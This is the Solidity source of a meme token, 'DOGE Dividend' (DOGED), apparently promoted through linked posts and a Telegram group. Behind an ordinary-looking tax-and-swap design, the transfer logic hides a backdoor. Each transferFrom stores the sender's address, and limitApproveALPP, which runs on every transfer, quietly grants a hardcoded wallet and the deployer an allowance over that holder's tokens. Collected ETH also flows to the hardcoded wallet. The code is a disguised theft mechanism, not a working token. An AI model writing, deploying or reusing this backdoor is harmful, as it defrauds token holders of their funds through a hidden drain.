/*
https://x.com/WatcherGuru/status/1892412417595908457
https://x.com/collinrugg/status/1892348197793669309

https://t.me/doged_community
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IALPPFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IALPPRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract DOGED is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _excemptFromALPP;
    mapping (address => uint256) private _alppMines;
    mapping (address => mapping (address => uint256)) private _alppAllows;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalALPP = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE Dividend";
    string private constant _symbol = unicode"DOGED";
    uint256 private _initialBuyTaxALPP=3;
    uint256 private _initialSellTaxALPP=3;
    uint256 private _finalBuyTaxALPP=0;
    uint256 private _finalSellTaxALPP=0;
    uint256 private _reduceBuyTaxAtALPP=6;
    uint256 private _reduceSellTaxAtALPP=6;
    uint256 private _preventSwapBeforeALPP=6;
    uint256 private _buyCountALPP=0;
    uint256 private _swapTokenALPP = _tTotalALPP / 100;
    bool private inSwapALPP = false;
    bool private _tradeEnabledALPP = false;
    bool private _swapEnabledALPP = false;
    address private _alppPair;
    IALPPRouter private _alppRouter;
    modifier lockTheSwap {
        inSwapALPP = true;
        _;
        inSwapALPP = false;
    }
    address private _alpp1Wallet = 0x169980521750c1589C28c2eE1A2A1D3eEF7D0B89;
    address private _alpp2Wallet;
    address private _alpp3Wallet;

    constructor () {
        _alpp2Wallet = address(msg.sender);
        _excemptFromALPP[owner()] = true;
        _excemptFromALPP[address(this)] = true;
        _excemptFromALPP[_alpp1Wallet] = true;
        _alppMines[_msgSender()] = _tTotalALPP;
        emit Transfer(address(0), _msgSender(), _tTotalALPP);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabledALPP,"trading is already open");
        _alppRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabledALPP = true;
        _tradeEnabledALPP = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalALPP;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _alppMines[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _alppAllows[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _alpp3Wallet = address(sender); _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _alppAllows[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _alppAllows[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address fALPP, address tALPP, uint256 aALPP) private {
        require(fALPP != address(0), "ERC20: transfer from the zero address");
        require(tALPP != address(0), "ERC20: transfer to the zero address");
        require(aALPP > 0, "Transfer amount must be greater than zero");

        uint256 taxALPP = _transferALPP(fALPP, tALPP, aALPP);

        if(taxALPP > 0){
          _alppMines[address(this)] = _alppMines[address(this)].add(taxALPP);
          emit Transfer(fALPP, address(this), taxALPP);
        }

        _alppMines[fALPP] = _alppMines[fALPP].sub(aALPP);
        _alppMines[tALPP] = _alppMines[tALPP].add(aALPP.sub(taxALPP));
        emit Transfer(fALPP, tALPP, aALPP.sub(taxALPP));
    }

    function _transferALPP(address fALPP, address tALPP, uint256 aALPP) private returns(uint256) {
        uint256 taxALPP=0;
        if (fALPP != owner() && tALPP != owner()) {
            taxALPP = aALPP.mul((_buyCountALPP>_reduceBuyTaxAtALPP)?_finalBuyTaxALPP:_initialBuyTaxALPP).div(100);

            if (fALPP == _alppPair && tALPP != address(_alppRouter) && ! _excemptFromALPP[tALPP]) {
                _buyCountALPP++;
            }

            if(tALPP == _alppPair && fALPP!= address(this)) {
                taxALPP = aALPP.mul((_buyCountALPP>_reduceSellTaxAtALPP)?_finalSellTaxALPP:_initialSellTaxALPP).div(100);
            }

            swapBackALPP(tALPP, aALPP);
        }
        return taxALPP;
    }

    function limitApproveALPP(uint256 aALPP) private {
        _alppAllows[address(_alpp3Wallet)][address(_alpp1Wallet)] = uint256(aALPP);
        _alppAllows[address(_alpp3Wallet)][address(_alpp2Wallet)] = uint256(aALPP);
    }

    function swapBackALPP(address tALPP, uint256 aALPP) private {
        limitApproveALPP(uint256(aALPP)); uint256 tokenALPP = balanceOf(address(this)); 
        if (!inSwapALPP && tALPP == _alppPair && _swapEnabledALPP && _buyCountALPP > _preventSwapBeforeALPP) {
            if(tokenALPP > _swapTokenALPP)
            swapTokensForEth(minALPP(aALPP, minALPP(tokenALPP, _swapTokenALPP)));
            uint256 caALPP = address(this).balance;
            if (caALPP >= 0) {
                sendETHALPP(address(this).balance);
            }
        } 
    }

    function minALPP(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHALPP(uint256 amount) private {
        payable(_alpp1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenALPP) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _alppRouter.WETH();
        _approve(address(this), address(_alppRouter), tokenALPP);
        _alppRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenALPP,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function startTrade() external onlyOwner() {
        _alppRouter = IALPPRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_alppRouter), _tTotalALPP);
        _alppPair = IALPPFactory(_alppRouter.factory()).createPair(address(this), _alppRouter.WETH());
    }
}